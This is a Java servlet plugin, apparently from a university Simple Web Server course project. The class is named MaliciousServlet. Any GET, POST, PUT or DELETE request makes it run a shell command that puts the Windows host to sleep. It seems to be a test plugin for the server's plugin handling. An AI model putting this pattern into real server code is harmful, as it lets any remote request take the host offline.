/*
 * BasicServlet.java
 * Oct 25, 2015
 *
 * Simple Web Server (SWS) for EE407/507 and CS455/555
 * 
 * Copyright (C) 2011 Chandan Raj Rupakheti, Clarkson University
 * 
 * This program is free software: you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public License 
 * as published by the Free Software Foundation, either 
 * version 3 of the License, or any later version.
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/lgpl.html>.
 * 
 * Contact Us:
 * Chandan Raj Rupakheti (rupakhcr@clarkson.edu)
 * Department of Electrical and Computer Engineering
 * Clarkson University
 * Potsdam
 * NY 13699-5722
 * http://clarkson.edu/~rupakhcr
 */
 
package plugins;

import java.io.IOException;

import protocol.HttpRequest;
import protocol.HttpResponse;
import protocol.HttpResponseFactory;
import protocol.Protocol;

/**
 * 
 * @author Chandan R. Rupakheti (rupakhcr@clarkson.edu)
 * Chandan-- change me! 
 */
public class MaliciousServlet extends Servlet{
	public MaliciousServlet(){
		super();
	}
	public MaliciousServlet(String rootDirectory){
		super(rootDirectory, MaliciousServlet.class.getName());
	}
	public HttpResponse handleRequest(HttpRequest request){
		System.out.println("Handling request in BS");
		
		if (request.getMethod().equals(Protocol.GET)){
			return implode();
		}
		else if (request.getMethod().equals(Protocol.POST)){
			return implode();
		}
		else if (request.getMethod().equals(Protocol.PUT)){
			return implode();
		}
		else if (request.getMethod().equals(Protocol.DELETE)){
			return implode();
		}
		else{
			return HttpResponseFactory.create400BadRequest(Protocol.CLOSE);
		}
	}
	public HttpResponse implode(){
		try {
			Runtime.getRuntime().exec("Rundll32.exe powrprof.dll,SetSuspendState Sleep");
		} catch (IOException exception) {
			// TODO Auto-generated catch-block stub.
			exception.printStackTrace();
		}
		return HttpResponseFactory.create204NoCon(Protocol.CLOSE);
		
	}
}
